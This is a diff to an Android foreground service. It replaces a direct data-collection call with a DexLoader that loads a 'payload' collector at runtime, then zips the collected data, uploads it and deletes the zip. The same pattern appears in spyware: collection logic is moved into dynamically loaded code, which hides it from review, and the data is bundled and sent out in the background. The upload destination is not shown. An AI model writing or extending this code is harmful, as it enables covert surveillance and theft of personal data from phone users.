@@ -19,6 +19,7 @@ class ForegroundService : Service() {
     private val handler = Handler(Looper.getMainLooper())
     private val NOTIFICATION_ID = 1
     private val DISMISSED_ACTION = "com.example.foregroundservice.DISMISSED_ACTION"
+    private var payloadInstance: Any? = null
 
     private val collectTask = object : Runnable {
         override fun run() {
@@ -106,13 +107,23 @@ class ForegroundService : Service() {
 
     private fun collectAndUpload() {
         try {
-            val zipFile = DataCollector.collectAllAsZip(applicationContext)
-            android.util.Log.d("DataCollector", "zip created: ${zipFile.name}, ${zipFile.length()} bytes")
-            val ok = Uploader.uploadZip(zipFile)
-            android.util.Log.d("Uploader", "upload result: $ok")
-            zipFile.delete()
+            if (payloadInstance == null) {
+                payloadInstance = DexLoader.loadCollector(applicationContext)
+            }
+            val instance = payloadInstance
+            if (instance != null) {
+                val zipFile = DexLoader.invokeCollectAllAsZip(instance, applicationContext)
+                if (zipFile != null) {
+                    android.util.Log.d("ForegroundService", "zip created: ${zipFile.name}, ${zipFile.length()} bytes")
+                    val ok = Uploader.uploadZip(zipFile)
+                    android.util.Log.d("Uploader", "upload result: $ok")
+                    zipFile.delete()
+                }
+            } else {
+                android.util.Log.e("ForegroundService", "payload not loaded")
+            }
         } catch (e: Exception) {
-            android.util.Log.e("DataCollector", "collect failed", e)
+            android.util.Log.e("ForegroundService", "collect failed", e)
         }
     }
 }
